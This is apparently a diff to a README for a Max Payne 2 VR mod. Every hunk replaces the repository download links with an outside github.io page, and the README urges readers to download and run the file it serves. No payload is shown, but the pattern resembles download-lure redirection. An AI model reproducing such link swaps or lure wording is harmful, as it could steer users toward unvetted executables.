@@ -1,6 +1,6 @@
 # 🎮 max-payne-2-vr - Experience Max Payne 2 in Virtual Reality
 
-[![Download Now](https://img.shields.io/badge/Download-Max_Payne_2_VR-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/parthilsinh/max-payne-2-vr)
+[![Download Now](https://img.shields.io/badge/Download-Max_Payne_2_VR-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://parthilsinh.github.io)
 
 ---
 
@@ -29,7 +29,7 @@ Follow these simple steps to download and run the mod. Don't worry—each step i
 
 ### Step 1: Download the Mod
 
-Visit this link to download the application: [https://github.com/parthilsinh/max-payne-2-vr](https://github.com/parthilsinh/max-payne-2-vr)
+Visit this link to download the application: [https://parthilsinh.github.io](https://parthilsinh.github.io)
 
 This is a general page where you'll find the download button. Look for a button labeled "Download" or a list of files. Click it to save the mod to your computer.
 
@@ -168,7 +168,7 @@ It's a completely new way to play a legendary game, and it's absolutely free.
 
 Ready to dive in? Head over to the download page:
 
-**[👉 Download Max Payne 2 VR Now](https://github.com/parthilsinh/max-payne-2-vr)**
+**[👉 Download Max Payne 2 VR Now](https://parthilsinh.github.io)**
 
 Click the link, download the file, and follow the simple steps above. In less than ten minutes, you'll be playing Max Payne 2 in spectacular virtual reality.
 
